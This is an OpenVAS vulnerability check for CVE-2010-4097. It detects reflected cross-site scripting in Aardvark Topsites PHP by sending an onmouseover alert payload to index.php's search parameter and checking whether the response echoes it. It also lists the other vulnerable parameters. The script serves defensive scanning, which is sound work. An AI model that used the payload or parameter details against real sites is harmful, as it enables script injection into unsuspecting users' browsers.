###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_aardvark_topsites_php_cms_xss_vuln.nasl 8228 2017-12-22 07:29:52Z teissa $
#
# Aardvark Topsites PHP 'index.php' Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to execute arbitrary
script code in the browser of an unsuspecting user in the context of the
affected site.

Impact Level: Application";

tag_affected = "Aardvark Topsites PHP version 5.2 and 5.2.1";

tag_insight = "The flaws are caused by improper validation of user-supplied
input via the 'mail', 'title', 'u', and 'url' parameters to 'index.php' that
allows the attackers to execute arbitrary HTML and script code.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Aardvark Topsites PHP CMS and is prone to cross
  site scripting vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801556");
  script_version("$Revision: 8228 $");
  script_tag(name:"last_modification", value:"$Date: 2017-12-22 08:29:52 +0100 (Fri, 22 Dec 2017) $");
  script_tag(name:"creation_date", value:"2010-12-09 06:36:39 +0100 (Thu, 09 Dec 2010)");
  script_cve_id("CVE-2010-4097");
  script_bugtraq_id(44390);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Aardvark Topsites PHP 'index.php' Multiple Cross Site Scripting Vulnerabilities");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/62767");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/514423/100/0/threaded");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

adpPort = get_http_port( default:80 );

foreach path (make_list("/atsphp", "/"))
{
  ## Check for the passible paths
  rcvRes = http_get_cache(item:string(path, "/index.php"), port:adpPort);

  ##  Confirm server installation for each path
  if(">Aardvark Topsites PHP<" >< rcvRes)
  {
    ## Send the constructed request
    sndReq = http_get(item:string(path, '/index.php?a=search&q=' +
             '"onmouseover=alert("XSS-TEST") par="'), port:adpPort);
    rcvRes = http_keepalive_send_recv(port:adpPort, data:sndReq);

    ## Check the response after exploit
    if(rcvRes =~ "HTTP/1\.. 200" && 'onmouseover=alert("XSS-TEST")" />' ><rcvRes)
    {
      security_message(port:adpPort);
      exit(0);
    }
  }
}
